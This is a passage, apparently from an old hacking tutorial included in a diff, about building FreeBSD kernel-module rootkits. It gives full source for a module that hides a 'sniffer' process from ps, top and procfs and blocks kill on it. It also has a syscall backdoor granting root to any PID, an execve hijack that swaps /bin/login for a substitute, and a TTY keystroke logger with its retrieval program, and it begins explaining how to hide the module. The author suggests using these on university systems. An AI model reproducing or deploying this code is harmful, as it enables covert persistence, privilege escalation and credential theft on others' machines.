+			(void)putchar('\n');
+			printheader();
+			lineno = 0;
+		}
+	}
+	exit(eval);
+
+There is only one line interesting for us :
+
+if ((kp = kvm_getprocs(kd, what, flag, &nentries)) == 0)
+
+</xmp>
+
+Note :
+what=KERN_PROC_ALL   for commands like 'ps'     flag=0<br>
+what=KERN_PRC_PID    for commands like 'ps PID' flag=PID<br>
+
+The  kvm_getprocs function (from the KVM lib) is the user space interface to
+access the kernel process lists. So let's take a look at this function in the
+library :
+<xmp>
+struct kinfo_proc *
+kvm_getprocs(kd, op, arg, cnt)
+	kvm_t *kd;
+	int op, arg;
+	int *cnt;
+{
+	int mib[4], st, nprocs;
+	size_t size;
+
+	if (kd->procbase != 0) {
+		free((void *)kd->procbase);
+		/*
+		 * Clear this pointer in case this call fails.  Otherwise,
+		 * kvm_close() will free it again.
+		 */
+		kd->procbase = 0;
+	}
+	if (ISALIVE(kd)) {
+		size = 0;
+		mib[0] = CTL_KERN;
+		mib[1] = KERN_PROC;
+		mib[2] = op;
+		mib[3] = arg;
+		st = sysctl(mib, op == KERN_PROC_ALL ? 3 : 4, NULL, &size, NULL, 0);
+		if (st == -1) {
+			_kvm_syserr(kd, kd->program, "kvm_getprocs");
+			return (0);
+		}
+		do {
+			size += size / 10;
+			kd->procbase = (struct kinfo_proc *)
+			    _kvm_realloc(kd, kd->procbase, size);
+			if (kd->procbase == 0)
+				return (0);
+			st = sysctl(mib, op == KERN_PROC_ALL ? 3 : 4,
+			    kd->procbase, &size, NULL, 0);
+		} while (st == -1 && errno == ENOMEM);
+		if (st == -1) {
+			_kvm_syserr(kd, kd->program, "kvm_getprocs");
+			return (0);
+		}
+		if (size % sizeof(struct kinfo_proc) != 0) {
+			_kvm_err(kd, kd->program,
+				"proc size mismatch (%d total, %d chunks)",
+				size, sizeof(struct kinfo_proc));
+			return (0);
+		}
+		nprocs = size / sizeof(struct kinfo_proc);
+	} else {
+		struct nlist nl[4], *p;
+
+		nl[0].n_name = "_nprocs";
+		nl[1].n_name = "_allproc";
+		nl[2].n_name = "_zombproc";
+		nl[3].n_name = 0;
+
+		if (kvm_nlist(kd, nl) != 0) {
+			for (p = nl; p->n_type != 0; ++p)
+				;
+			_kvm_err(kd, kd->program,
+				 "%s: no such symbol", p->n_name);
+			return (0);
+		}
+		if (KREAD(kd, nl[0].n_value, &nprocs)) {
+			_kvm_err(kd, kd->program, "can't read nprocs");
+			return (0);
+		}
+		size = nprocs * sizeof(struct kinfo_proc);
+		kd->procbase = (struct kinfo_proc *)_kvm_malloc(kd, size);
+		if (kd->procbase == 0)
+			return (0);
+
+		nprocs = kvm_deadprocs(kd, op, arg, nl[1].n_value,
+				      nl[2].n_value, nprocs);
+#ifdef notdef
+		size = nprocs * sizeof(struct kinfo_proc);
+		(void)realloc(kd->procbase, size);
+#endif
+	}
+	*cnt = nprocs;
+	return (kd->procbase);
+}
+</xmp>
+Look at the ISALIVE if construct. Here the library call decides wether it looks
+for 'living' procs (->allprocs list) or 'dead' procs (->zombrocs). My further
+explaination (and module) is based on a 'living' process (what worth is a
+'dead' sniffer ?). So let's take a look at that case.<br>
+First of all a MIB array is constructed where the operation (op) and an
+argument (arg) is inserted. The other two fields are predefined. The op field
+is equal to the what value from the ps program (KERN_PROC_ALL, for example)
+and the arg field is equal to the flag variable in ps.c (1 or 0). After this
+a sysctl is issued with the corresponding MIB.<br>
+This sysctl call finally reaches sysctl_kern_proc :
+<xmp>
+static int
+sysctl_kern_proc SYSCTL_HANDLER_ARGS
+{
+	int *name = (int*) arg1;
+	u_int namelen = arg2;
+	struct proc *p;
+	int doingzomb;
+	int error = 0;
+
+	if (oidp->oid_number == KERN_PROC_PID) {
+		if (namelen != 1) 
+			return (EINVAL);
+		p = pfind((pid_t)name[0]);
+		if (!p)
+			return (0);
+		error = sysctl_out_proc(p, req, 0);
+		return (error);
+	}
+	if (oidp->oid_number == KERN_PROC_ALL && !namelen)
+		;
+	else if (oidp->oid_number != KERN_PROC_ALL && namelen == 1)
+		;
+	else
+		return (EINVAL);
+	
+	if (!req->oldptr) {
+		/* overestimate by 5 procs */
+		error = SYSCTL_OUT(req, 0, sizeof (struct kinfo_proc) * 5);
+		if (error)
+			return (error);
+	}
+	for (doingzomb=0 ; doingzomb < 2 ; doingzomb++) {
+		if (!doingzomb)
+			p = allproc.lh_first;
+		else
+			p = zombproc.lh_first;
+		for (; p != 0; p = p->p_list.le_next) {
+			/*
+			 * Skip embryonic processes.
+			 */
+			if (p->p_stat == SIDL)
+				continue;
+			/*
+			 * TODO - make more efficient (see notes below).
+			 * do by session.
+			 */
+			switch (oidp->oid_number) {
+
+			case KERN_PROC_PGRP:
+				/* could do this by traversing pgrp */
+				if (p->p_pgrp == NULL || 
+				    p->p_pgrp->pg_id != (pid_t)name[0])
+					continue;
+				break;
+
+			case KERN_PROC_TTY:
+				if ((p->p_flag & P_CONTROLT) == 0 ||
+				    p->p_session == NULL ||
+				    p->p_session->s_ttyp == NULL ||
+				    p->p_session->s_ttyp->t_dev != (dev_t)name[0])
+					continue;
+				break;
+
+			case KERN_PROC_UID:
+				if (p->p_ucred == NULL || 
+				    p->p_ucred->cr_uid != (uid_t)name[0])
+					continue;
+				break;
+
+			case KERN_PROC_RUID:
+				if (p->p_ucred == NULL || 
+				    p->p_cred->p_ruid != (uid_t)name[0])
+					continue;
+				break;
+			}
+
+			error = sysctl_out_proc(p, req, doingzomb);
+			if (error)
+				return (error);
+		}
+	}
+	return (0);
+}
+</xmp>
+This function first checks whether we want information on all processes
+(KERN_ALL_PROCS) or on a single process (KERN_PROC_PID). This means our hack
+also must handle these two cases. The rest of the function is quite obvious.
+The allproc data is collected and copied in the user space buffer. The last
+sysctl_out_proc() function does the rest :
+<xmp>
+
+static int
+sysctl_out_proc(struct proc *p, struct sysctl_req *req, int doingzomb)
+{
+	struct eproc eproc;
+	int error;
+	pid_t pid = p->p_pid;
+
+	fill_eproc(p, &eproc);
+	error = SYSCTL_OUT(req,(caddr_t)p, sizeof(struct proc));
+	if (error)
+		return (error);
+	error = SYSCTL_OUT(req,(caddr_t)&eproc, sizeof(eproc));
+	if (error)
+		return (error);
+	if (!doingzomb && pid && (pfind(pid) != p))
+		return EAGAIN;
+	if (doingzomb && zpfind(pid) != p)
+		return EAGAIN;
+	return (0);
+}
+</xmp>
+This will set return code and move the memory. That's all.
+[A big SORRY to all kernel freaks, but explaining all this in more detail would
+produce 100 pages and more... ]. <br>
+My module also handles the kill signal just to demonstrate that it is also
+possible to intercept any signal calls to the PID of the process we want to
+hide. Recall that hiding does not mean that signals can't reach our process !
+Here is my module :<br>
+<xmp>
+/*This module shows how to hide any process from commands like 'ps' or 'top'.
+Recall that BSD uses the so called kvm library which uses special MIBs
+with sysctl commands, to get access to the kernel 'allproc' and 'zombroc' list
+from user space. Linux only relies on the procfs, so BSD is a bit harder to
+attack.*/
+
+/*FEATURES  : 
+1 - This module hides a certain process from proc lists produced by ps or top
+2 - This module hides a certain process from direct calls like 'ps PID'
+3 - This module intercepts the kill syscall in order to avoid killing our
+    process we want to hide (the kill is just an add-on, normally you are
+    secure enough with the points 1,2 and 4)
+4 - This module hides the proc entry from the procfs 
+*/
+
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <sys/queue.h>
+#include <dirent.h>
+#include <sys/sysctl.h>
+
+/*exact name of the process (+arguments) we want to hide*/
+#define HIDE_PROC "sniffer"
+
+/*this structure is used by BSD to describe a process for user space programs*/
+struct kinfo_proc {
+	struct	proc kp_proc;			/* proc structure */
+	struct	eproc {
+		struct	proc *e_paddr;		/* address of proc */
+		struct	session *e_sess;	/* session pointer */
+		struct	pcred e_pcred;		/* process credentials */
+		struct	ucred e_ucred;		/* current credentials */
+		struct  procsig e_procsig;	/* shared signal structure */
+                /*PADDING stuff*/
+		/*struct	vmspace e_vm;		 address space */
+		char pad1[180];
+                pid_t	e_ppid;			/* parent process id */
+		pid_t	e_pgid;			/* process group id */
+		short	e_jobc;			/* job control counter */
+		dev_t	e_tdev;			/* controlling tty dev */
+		pid_t	e_tpgid;		/* tty process group id */
+		struct	session *e_tsess;	/* tty session pointer */
+#define	WMESGLEN	7
+		char	e_wmesg[WMESGLEN+1];	/* wchan message */
+		segsz_t e_xsize;		/* text size */
+		short	e_xrssize;		/* text rss */
+		short	e_xccount;		/* text references */
+		short	e_xswrss;
+		long	e_flag;
+#define	EPROC_CTTY	0x01	/* controlling tty vnode active */
+#define	EPROC_SLEADER	0x02	/* session leader */
+		char	e_login[roundup(MAXLOGNAME, sizeof(long))];	/* setlogin() name */
+		long	e_spare[2];
+	} kp_eproc;
+};
+
+/*we need this counter to get the right sysctl call*/
+int global_counter;
+
+
+/*We need to define M_DIRP2 for allocating some memory in kernel space with
+  the help of the MALLOC macro*/
+MALLOC_DEFINE(M_DIRP2, "dirp2", "struct");
+
+
+/*This function returns the PID of the process we want to hide*/
+int 
+get_pid()
+{
+ struct proc *p;
+ 
+ p=allproc.lh_first;
+ for (; p!=0; p=p->p_list.le_next)
+ {
+  /*p->p_comm holds the process name*/
+  if (strcmp(p->p_comm, HIDE_PROC)==0)
+  {
+   return p->p_pid;
+  }
+ }
+ return -1;
+}
+
+/*nothing big, but for demonstration*/
+static int
+hacked_kill(struct proc *p, struct kill_args *uap)
+{
+ if (uap->pid==get_pid())
+  return ESRCH;
+ else
+  return kill(p, uap);
+}
+
+/*the BIG sysctl hack :)*/
+static int
+hacked_sysctl(struct proc *p, struct sysctl_args *uap)
+{
+ /*this will hold the MIB values*/
+ int mib[4]; 
+ size_t size, newsize;
+ /*this will hold the kinfo_proc structures in our kernel space*/
+ struct kinfo_proc kpr; 
+ /*just some stuff we need*/
+ int tmp, counter;
+
+ /*call sysctl, and get return value*/
+ tmp= __sysctl(p, uap);
+
+ /*grab the MIB from user space*/
+ copyin(uap->name, &mib, sizeof(mib)); 
+
+ /*Did someone issue something like 'ps PID' -> in order to get information
+ on a certain single process ? If so we need to handle this. Attention :
+ I skipped checkin' the first two mib[] fields, again I'm lazy :)*/
+ if (mib[2]==KERN_PROC_PID)
+ {
+  /*Does he want to get info on our process ?*/
+  if (mib[3]==get_pid())
+  {
+   /*If so we return a size value of 0 standing for no such process*/
+   size=0;
+   /*copy to user space*/
+   copyout(&size, uap->oldlenp, sizeof(size));
+   /*and return*/
+   return(0); 
+  }
+  else
+   /*otherwise display the reqeuested information*/
+   return 0;
+ }
+
+ /*the following code will handle calls like 'ps' and 'top' with ALL PROCS 
+ enable*/
+ /*ok, we need to check the MIB for 'hacking' the real sysctl
+   our first check is it CTL_KERN*/
+ if (mib[0]==CTL_KERN)
+ 
+ /*our second check is it KERN_PROC*/
+  if (mib[1]==KERN_PROC)
+
+  /*our third check : is it the second sysctl (not the one retrieving the
+   kinfo_proc structure list size ?*/
+   if (uap->old!=NULL)
+   {
+    /*only catch the first call*/
+    if (global_counter==0)
+    {
+     global_counter++;
+     /*now it's time to check for our PID we want to hide*/
+     /*NOTE : Here we check the memory region in user space for a kinfo_proc
+              structure with the needed PID*/
+     for (counter=0;(counter*sizeof(kpr)<=size); counter++)
+     {
+      /*copy from user to kernel space*/
+      copyin(uap->old+counter*sizeof(kpr), &kpr, sizeof(kpr));
+      /*do we have our PID ?*/
+      if (kpr.kp_proc.p_pid==get_pid()) 
+      {
+       /*YES, so patch the size of the memory region (decrement by one
+       kinfo_proc structure)*/
+       newsize=size-sizeof(kpr); 
+       /*'overlap' the memory, so we 'cut' our entry out*/
+       bcopy(uap->old+(counter+1)*sizeof(kpr), uap->old+counter*sizeof(kpr),
+             size-(counter+1)*sizeof(kpr));
+       
+      }
+     }
+     /*set the new size*/
+     copyout(&newsize, uap->oldlenp, sizeof(size));
+     /*and finally return*/
+     return 0;    
+    }  
+   }
+   /*we have the sysctl call, that requests the memory size of the kinfo_proc
+   list*/
+   /*if uap->old == NULL, then the user requests the process count*/
+   else
+   { 
+    /*we also need the size (count), so get it*/
+    copyin(uap->oldlenp, &size, sizeof(size));
+    /*in sys/kern/kern_proc.c BSD uses a size overestimated by 5 structures,
+    so we need to correct (decrease) that*/
+    size-=sizeof(kpr)*5;
+    newsize=size;
+    /*set global_counter to 0 for catching the only next sysctl*/
+    global_counter=0;
+   }
+ return tmp; 
+}
+
+
+/*Normal getdirentries hack for hiding the process from procfs*/
+static int
+hacked_getdirentries (struct proc *p, struct getdirentries_args *uap)
+{      
+ unsigned int tmp, n, t;
+ struct dirent *dirp2, *dirp3;
+  
+ /*The file we want to hide : The name must match exactly !*/
+ char hide[255];
+
+
+ /*copy the HIDE_PROC number into the hide string*/
+ sprintf(hide, "%d", get_pid()); 
+
+ /*just issue the syscall*/
+ getdirentries(p,uap);
+ 
+ /*this is the way BSD returns status values to the process issueing the
+   request.*/
+ tmp=p->p_retval[0];
+ 
+ if (tmp>0)
+ { 
+  /*allocate memory*/
+  MALLOC(dirp2, struct dirent*, tmp, M_DIRP2, M_NOWAIT);
+  /*copy the dirent structure for user space in our kernel space*/
+  copyin(uap->buf, dirp2, tmp);
+
+  /*dirp3 points to dirp2*/
+  dirp3=dirp2;
+ 
+  t=tmp;
+  
+  /*In this loop we check for every dirent structure in the user buffer*/
+  while (t > 0)
+  {
+   n = dirp3->d_reclen;
+   t-=n;
+   /*Do we have the entry for our file to hide (I don't check for procfs)*/
+   if (strcmp((char*)&(dirp3->d_name), (char*)&hide)==0) 
+   {
+    if (t!=0)  
+    {
+     /*ATTENTION : Do not use something like strcpy or so. bcopy is able to
+                   handle overlapping memroy locations, so this is our choice*/
+     bcopy((char*)dirp3+n,dirp3, t);
+    }
+    /*the dirent structure list is shorter now*/
+    tmp-=n;
+   }
+   /*The following piece of code is necessary, because we get one dirent entry
+     with d_reclen=0, if we would not implement this, we would get an infinite
+     while loop*/
+   if (dirp3->d_reclen==0) 
+   {
+    /*end is reached*/
+    t=0;
+   }
+   /*as long as there is something to copy, do it*/
+   if (t!=0)
+    /*get the next pointer from the dirent structure list*/ 
+    dirp3=(struct dirent*)((char*)dirp3+dirp3->d_reclen); 
+  }
+  /*we must decrement the getdirentries user call return value, if we changed
+    something*/
+   p->p_retval[0]=tmp; 
+
+  /*copy the whole (perhaps modified) memory back to the user buffer*/
+  copyout(dirp2, uap->buf, tmp);
+ 
+  /*free kernel memory*/
+  FREE(dirp2, M_DIRP2);
+ }
+ /*everything ok, so return 0*/
+ return	0;
+}
+
+/*the hacked getdirentries syscall*/
+static struct sysent hacked_getdirentries_sysent = {
+       4,	
+       hacked_getdirentries			/* sy_call */
+};
+
+
+/*the hacked kill sysentry*/
+static struct sysent hacked_kill_sysent = {
+       2,
+       hacked_kill
+};
+
+/*the hacked sysctl sysentry*/
+static struct sysent hacked_sysctl_sysent = {
+       6,	
+       hacked_sysctl			/* sy_call */
+};
+
+
+/*
+ * The function called at load/unload.
+ */
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+ 
+ switch (cmd) {
+  case MOD_LOAD :
+   /*replace the sysctl syscall with our own*/
+   sysent[202]=hacked_sysctl_sysent;
+   /*replace the kill syscall with our own*/
+   sysent[37]=hacked_kill_sysent;
+   /*replace the getdirentries syscall with our own*/
+   sysent[196]=hacked_getdirentries_sysent;
+  break;
+  case MOD_UNLOAD :
+   /*argument count has not changed, so we only need to restore the
+   function pointer*/
+   sysent[202].sy_call=(sy_call_t*)__sysctl;
+   sysent[37].sy_call=(sy_call_t*)kill;
+   sysent[196].sy_call=(sy_call_t*)getdirentries;
+  break;
+  default :
+   error = EINVAL;
+  break;
+ }
+ return error;
+}
+
+                                            
+/*module data*/         
+static moduledata_t syscall_mod = {
+ "ProcHide", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+  
+</xmp>
+Load this module and the process will be hidden. Already started processes can
+- of course - also be hidden.<br>
+You may say that this solution does not look very nice, I know, but again it's
+working. And please bear in mind that this module is again experimental.
+For kernel starters :<br>
+You may wonder why I didn't patch the allproc or zombproc list directly. Well
+those lists are also required for scheduling and other important system tasks.
+It would be far too complicated to code something like this, I really think
+that it's quite impossible.
+
+<p>
+<H3><A NAME="II.3.2."></A>3.2 Backdoor 'rootshell'</h3>
+<p>
+The following module was a nice idea I had when playing around with the proc
+structure. Load this module, and you can 'SU' without a password.
+The idea is very simple. The module implements a system call that gets one
+argument : a PID. This can be the PID of any process, but will normally be the
+PID of your user account shell (tcsh, sh, bash or whatever). This
+process will then become root (UID 0) by manipulating its cred structure.
+Here we go :
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/lock.h>
+
+/*arguments for our system call*/
+struct make_me_root_args {
+ /*which process should be set UID=0?*/
+ int p_pid;
+};
+ 
+/*A very simple system call handler making a certain process UID=0*/
+static int
+make_me_root (struct proc *p, struct make_me_root_args *uap)
+{
+ struct proc *pr=pfind(uap->p_pid);
+ 
+ /*this is all we need...*/
+ pr->p_cred->pc_ucred->cr_uid=0; 
+ return 0;
+}
+
+/*
+ * The `sysent' for the our syscall
+ */
+static struct sysent make_me_root_sysent = {
+	1,			/* sy_narg */
+	make_me_root		/* sy_call */
+};
+
+/*we choose slot number 210, because it's free on FreeBSD 3.1*/
+static int offset = 210;
+
+/*nothing to do here*/
+static int
+load (struct module *module, int cmd, void *arg)
+{
+ return 0;
+}
+
+/*start everything*/
+SYSCALL_MODULE(rootmod, &offset, &make_me_root_sysent, load, NULL);
+
+</xmp>
+The problem is that anyone can call this system call, but you can add some
+kind of simple authentication (like I did before) or just hide it with a
+filesysetem hack ;).
+
+Here's the user space :
+<xmp>
+/*in argv[1] this program waits for the PID to set UID=0*/
+#include <stdio.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/module.h>
+
+struct make_me_root_args {
+ int p_pid;
+};
+ 
+int
+main(int argc, char **argv)
+{
+ struct make_me_root_args mmra;
+
+ mmra.p_pid=atoi(argv[1]);
+ return syscall (210, mmra);
+}
+</xmp>
+In my opinion this is one of the easiest local backdoors. Interesting for
+thousands of students. Image your university uses a buggy FreeBSD system (every
+system is buggy, no piece of software is perfect). Do the scrippt-kiddie trick
+and become root, install the module (hiding should be added) and you are done.
+
+<p>
+<H3><A NAME="II.4."></A>4. File execution redirection</h3>
+<p>
+This method and its advantages were already described in my Linux article, so
+I will only give you the code plus some short words. Please note that this
+hack approach is a bit different from the Linux idea, so pay attention :
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <dirent.h>
+
+/* 
+ * Shareable process virtual address space.
+ * May eventually be merged with vm_map.
+ * Several fields are temporary (text, data stuff).
+ */
+struct vmspace {
+/*NOTE : I just used some padding stuff, to avoid too much include file
+         problems...
+*/
+/*	struct vm_map vm_map;	 VM address map */
+        char pad1[100];
+/*	struct pmap vm_pmap;	 private physical map */
+        char pad2[36];
+	int vm_refcnt;		/* number of references */
+	caddr_t vm_shm;		/* SYS5 shared memory private data XXX */
+/* we copy from vm_startcopy to the end of the structure on fork */
+#define vm_startcopy vm_rssize
+	segsz_t vm_rssize;	/* current resident set size in pages */
+	segsz_t vm_swrss;	/* resident set size before last swap */
+	segsz_t vm_tsize;	/* text size (pages) XXX */
+	segsz_t vm_dsize;	/* data size (pages) XXX */
+	segsz_t vm_ssize;	/* stack size (pages) */
+	caddr_t vm_taddr;	/* user virtual address of text XXX */
+	caddr_t vm_daddr;	/* user virtual address of data XXX */
+	caddr_t vm_maxsaddr;	/* user VA at max stack growth */
+	caddr_t vm_minsaddr;	/* user VA at max stack growth */
+};
+
+
+/*the hacked execve syscall*/
+static 
+int hacked_execve(struct proc *p, struct execve_args *uap)
+{
+ char name[255];
+ /*the file we want to redirect*/
+ char old_name[]="/bin/login";
+ /*the new file to execute, perhaps hiding is a good idea...*/
+ char new_name[]="/bin/newlogin";
+ size_t done;
+ struct obreak_args oa;
+ struct execve_args kap;
+ struct execve_aegs *nap;
+ char *user_new_name;      
+ 
+ /*get the program name the system (user) wants to execute via execve*/
+ copyinstr(uap->fname, name, 255, &done);
+
+ /*do we have the right file name?*/
+ if (strcmp((char*)&name, (char*)&old_name)==0)
+ {
+  /*IDEA : Now we allocate a bit of user space memory for a new execve_args
+           structure...*/
+  /*allocate one page*/
+  oa.nsize=curproc->p_vmspace->vm_daddr+ctob(curproc->p_vmspace->vm_dsize)+
+           4096;
+
+  /*set the adress*/
+  user_new_name=oa.nsize-256;
+  /*copy the new name to user space location*/
+  copyout(&new_name, user_new_name, strlen(new_name));
+  /*set the pointer kap.fname to the user space location*/
+  kap.fname=oa.nsize-256;
+  /*set the pointer kap.argv to the old uap entry in user space*/
+  kap.argv=uap->argv;
+  /*the same as above*/
+  kap.envv=uap->envv;
+  /*set the adress for the new execve_args structure in user space*/
+  nap=(struct execve_args*)oa.nsize-4000;
+  /*copy the kernel execve_args structure to the user space one*/
+  copyout(&kap, nap, sizeof(struct execve_args));
+  /*execute the new command with the same argv and envv values*/
+  return execve(curproc, nap);
+ }
+ /*if we don't have our file, just continue*/ 
+ return execve(p, uap);
+}
+
+/*the hacked execve syscall*/
+static struct sysent hacked_execve_sysent = {
+       3,	
+       hacked_execve			/* sy_call */
+};
+
+
+
+/*
+ * The function called at load/unload.
+ */
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+ switch (cmd) {
+  case MOD_LOAD :
+   /*replace the execve syscall with our own*/
+   sysent[SYS_execve]=hacked_execve_sysent;
+  break;
+  case MOD_UNLOAD :
+   /*argument count has not changed, so we only need to restore the
+   function pointer*/
+   sysent[SYS_execve].sy_call=(sy_call_t*)execve;
+  break;
+  default :
+   error = EINVAL;
+  break;
+ }
+ return error;
+}
+
+                                         
+        
+static moduledata_t syscall_mod = {
+ "ExeRedirect", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</xmp>
+
+I had to reuse an execve system call, so I was forced to allocate some user
+space memory for the new args. This is why the module is a bit long.
+
+<p>
+<H3><A NAME="II.5."></A>5. TTY hijacking</h3>
+<p>
+TTY hijacking has a long tradition, and though there may be lots of ways to do,
+kernel code is a quite nice solution. It was demonstrated on Linux boxes with
+LKM. Now it's time to show you how it works on BSD. <br>
+So take a look at my 10 minutes hack (don't expect good code) :
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+
+/*TTY we want to hijack*/
+#define MAJOR 12
+#define MINOR 2
+
+/*buffer size to use (for TTY data)*/
+#define BUFSIZE 8192
+
+/*global memory for saving all TTY inputs*/
+char *ttybuf;
+
+/*global counter to implement some (bad) kind of ring buffer*/
+int globalcounter=0;
+
+MALLOC_DEFINE(M_BUF, "buf", "buf");
+
+
+/*structure for system call to retrieve the TTYbuf data*/
+static struct get_tty_args {
+ char *buf;
+};
+
+/*I packed some structures into this module, to make things clearer.*/
+struct specinfo {
+	struct	vnode **si_hashchain;
+	struct	vnode *si_specnext;
+	struct	mount *si_mountpoint;
+	dev_t		si_rdev;
+	unsigned long	si_blksize; 
+};
+
+
+/*stuff needed for vnode structure*/
+typedef	int 	vop_t __P((void *));
+enum vtype	{ VNON, VREG, VDIR, VBLK, VCHR, VLNK, VSOCK, VFIFO, VBAD };
+TAILQ_HEAD(buflists, buf);
+
+
+/*non-complete vnode structure, we only need the device parts.*/
+struct vnode {
+	u_long	v_flag;				/* vnode flags (see below) */
+	int	v_usecount;			/* reference count of users */
+	int	v_writecount;			/* reference count of writers */
+	int	v_holdcnt;			/* page & buffer references */
+	daddr_t	v_lastr;			/* last read (read-ahead) */
+	u_long	v_id;				/* capability identifier */
+	struct	mount *v_mount;			/* ptr to vfs we are in */
+	vop_t	**v_op;				/* vnode operations vector */
+	TAILQ_ENTRY(vnode) v_freelist;		/* vnode freelist */
+	LIST_ENTRY(vnode) v_mntvnodes;		/* vnodes for mount point */
+	struct	buflists v_cleanblkhd;		/* clean blocklist head */
+	struct	buflists v_dirtyblkhd;		/* dirty blocklist head */
+	LIST_ENTRY(vnode) v_synclist;		/* vnodes with dirty buffers */
+	long	v_numoutput;			/* num of writes in progress */
+	enum	vtype v_type;			/* vnode type */
+	union {
+		struct mount	*vu_mountedhere;/* ptr to mounted vfs (VDIR) */
+		struct socket	*vu_socket;	/* unix ipc (VSOCK) */
+		struct specinfo	*vu_specinfo;	/* device (VCHR, VBLK) */
+		struct fifoinfo	*vu_fifoinfo;	/* fifo (VFIFO) */
+	} v_un;
+       /*....*/	
+};
+
+
+/*the shortest systemcall I ever saw, but (again) everything is working*/
+static 
+void get_tty(struct proc *p, struct get_tty_args *uap)
+{
+ copyout(ttybuf, uap->buf, BUFSIZE);
+}
+
+/*the hacked write syscall*/
+static 
+int hacked_write(struct proc *p, struct write_args *uap)
+{
+ /*we will examine the vnode of the file it is read from*/
+ struct vnode *vn;
+ /*we have to check the device for our TTY*/
+ dev_t device;
+
+ /*get the vnode*/
+ vn=(struct vnode*)curproc->p_fd->fd_ofiles[uap->fd]->f_data;
+ 
+ /*do we have a character device?*/
+ if (vn->v_type==VCHR)
+ {
+  /*if so get the device*/
+  device=vn->v_un.vu_specinfo->si_rdev;
+  /*check for MAJOR and MINOR codes*/
+  if ((major(device)==MAJOR) && (minor(device)==MINOR))
+  { 
+   /*arghh, this is no nice solution. Computer Science students should
+     correct this bad ring buffer implementation*/
+    if ((globalcounter+uap->nbyte)>BUFSIZE) globalcounter=0;
+   /*again no nice coding, just call me Mr. Lazy ;)*/ 
+    if (uap->nbyte<BUFSIZE)
+     copyin(uap->buf, ttybuf+globalcounter, uap->nbyte);   
+    globalcounter+=uap->nbyte;
+  }
+ }
+ return write(p, uap);
+}
+
+/*the hacked open syscall*/
+static struct sysent hacked_write_sysent = {
+       3,	
+       hacked_write			/* sy_call */
+};
+
+/*our own system call for bringing the kernel buffer to user space*/
+static struct sysent get_tty_sysent = {
+       1,	
+       get_tty			/* sy_call */
+};
+
+
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+ switch (cmd) {
+  case MOD_LOAD :
+   /*allocate memory. Bear in mind that M_NOWAIT is always a bit critical!*/
+   MALLOC(ttybuf, char*, BUFSIZE, M_BUF, M_NOWAIT);
+   /*replace the execve syscall with our own*/
+   sysent[SYS_write]=hacked_write_sysent;
+   /*again we use slot 210*/
+   sysent[210]=get_tty_sysent;
+  break;
+  case MOD_UNLOAD :
+   /*free buffer*/
+   FREE(ttybuf, M_BUF);
+   /*argument count has not changed, so we only need to restore the
+   function pointer*/
+   sysent[SYS_write].sy_call=(sy_call_t*)write;
+  break;
+  default :
+   error = EINVAL;
+  break;
+ }
+ return error;
+}
+                                                   
+        
+static moduledata_t syscall_mod = {
+ "TTYhijack", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</xmp>
+
+For any explainations read my Linux LKM text :). TTY hijacking is realized by
+intercepting every write system call and checking the vnode for the correct
+device codes (specified through major and minor).<br>
+The following little program represents the user space part, getting the 
+data.
+<xmp>
+#include <stdio.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/module.h>
+
+struct get_tty_args {
+ char *buf;
+};
+
+int
+main(int argc, char **argv)
+{
+ /*maybe you have to adjust the size value (see BUFSIZE in module)*/
+ char *buf=(char*)malloc(8192);
+ struct get_tty_args uap;
+ int counter;
+
+ uap.buf=buf;
+ syscall (210, uap);
+ /*I used this way of printing, maybe it would be a better job to handle some
+   command codes (old plain ASCII)*/
+ for (counter=0; counter<=8192; counter++)
+  printf("%c", buf[counter]);
+}
+</xmp>
+Ok, start the module with desired device codes. Wait some time, and start user
+space program...<br>
+The first big Linux TTY hijacking LKM used a device to manage the TTY buffer.
+Of course, this would also work on FreeBSD, but I hadn't got the time, so
+I just installed a system call.
+
+<p>
+<H3><A NAME="II.6."></A>6. Hiding the module</h3>
+<p>
+[Note : LKM hiding under FreeBSD 2.x systems was done before, KLD hiding for
+3.x systems is new, so read & learn.]<br>
+Now it's time to discuss hiding of our module. First of all we have to think
+about what to hide.<br>
+As I explained above there is a big difference between a link file and a
+module. Commands like 'kldstat' will give you a listing of loaded linkfiles,
+but there is no command to get a list of all loaded modules. 
+So guess where kldstat gets the listing from. It's just the linker file list 
+'files'. Now it's quite easy to hide this module and make it unremovable. Just
+delete the desired entry from the files list, and everything is fine. There are
+no problems with doing this (like there were with the proc lists). I have to
+admit that I only analyzed 40 % of the whole kernel code (I will continue) so
